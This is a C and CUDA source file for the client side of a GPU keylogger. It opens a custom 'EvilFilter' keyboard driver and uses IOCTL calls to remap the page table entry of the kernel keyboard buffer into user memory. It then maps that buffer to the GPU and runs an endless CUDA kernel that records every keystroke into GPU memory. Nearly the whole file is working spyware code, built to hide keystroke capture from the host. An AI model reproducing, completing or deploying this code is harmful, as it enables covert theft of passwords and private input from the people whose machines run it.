#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include "helper_cuda.h"
#include "device_launch_parameters.h"
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>

#define DEBUG 1

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) { // , PCHAR KeyMap
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
			
//			if (keyboardData->MakeCode) {
				if (*keystrokeIndex < 9998) {
					cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
				}
				printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]\n",
					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
					keyboardData->MakeCode,
					KeyMap[keyboardData->MakeCode],
					keyboardData->UnitId,
					keyboardData->Flags,
					keyboardData->Reserved,
					keyboardData->ExtraInformation);
//			}

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PKEYBOARD_INPUT_DATA cudaKeyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PCHAR cudaKeyMap;
				PCHAR cudaBuffer;
				PUSHORT lastMake;
				PUSHORT lastModifier;
				PULONG keystrokeIndex;
				UCHAR init0 = 666;
				ULONG init0long = 0;


				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(cudaSetDevice(0));
				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));


				printf("Allocating lastMake...\n");
				checkCudaErrors(cudaMalloc(&lastMake, sizeof(USHORT)));
				printf("Allocating lastModifier...\n");
				checkCudaErrors(cudaMalloc(&lastModifier, sizeof(USHORT)));
				printf("Allocating keystrokeIndex...\n");
				checkCudaErrors(cudaMalloc(&keystrokeIndex, sizeof(ULONG)));

				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(cudaMalloc(&cudaBuffer, sizeof(CHAR) * 10000));
				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(cudaMalloc((void **)&cudaKeyMap, sizeof(char) * 84));

				printf("Copying 0 to lastMake...");
				checkCudaErrors(cudaMemcpy(lastMake, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to lastModifier...");
				checkCudaErrors(cudaMemcpy(lastModifier, &init0, sizeof(USHORT), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to keystrokeIndex...");
				checkCudaErrors(cudaMemcpy(keystrokeIndex, &init0long, sizeof(ULONG), cudaMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying KeyMap to cudaKeyMap...");
				checkCudaErrors(cudaMemcpy(cudaKeyMap, KeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	printf("coppied.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(cudaHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));
				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
				printf("Launching CUDA process...");
				dim3 grid(1);
				dim3 block(1); 
				while (TRUE) {
					logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer, lastMake, lastModifier, keystrokeIndex);
					checkCudaErrors(cudaDeviceSynchronize());
				}
				printf("Launched.\n");
			}
		}
		CloseHandle(hControlDevice);
	}
	printf("fin.\n");
	return 0;
}

